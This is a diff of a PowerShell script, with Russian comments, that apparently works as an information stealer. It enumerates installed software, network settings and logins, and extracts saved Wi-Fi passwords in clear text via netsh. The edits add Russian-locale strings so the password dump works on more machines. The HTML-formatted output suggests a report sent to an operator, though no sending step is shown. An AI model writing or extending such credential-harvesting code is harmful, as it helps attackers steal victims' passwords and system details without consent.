@@ -45,7 +45,8 @@ $appList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\Current
 
 $apps = ""
 foreach ($app in $appList) {
-    $apps += "📦 $($app.DisplayName) ($($app.DisplayVersion))`n"
+    $version = $app.DisplayVersion
+    $apps += if ($version) { "📦 $($app.DisplayName) ($version)`n" } else { "📦 $($app.DisplayName)`n" }
 }
 
 # === Сетевые параметры ===
@@ -80,14 +81,14 @@ foreach ($entry in $loginList) {
 }
 
 # === Получение паролей Wi-Fi ===
-$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile|Все профили пользователей" | ForEach-Object {
     ($_ -split ":")[1].Trim()
 }
 
 $wifiPasswords = ""
 foreach ($profile in $wifiProfiles) {
     $wifiDetails = netsh wlan show profile name="$profile" key=clear
-    $wifiPassword = ($wifiDetails | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
+    $wifiPassword = ($wifiDetails | Select-String "Key Content|Содержимое ключа" | ForEach-Object { ($_ -split ":")[1].Trim() })
     if ($wifiPassword) {
         $wifiPasswords += "🔑 <i>$profile</i>: $wifiPassword`n"
     }
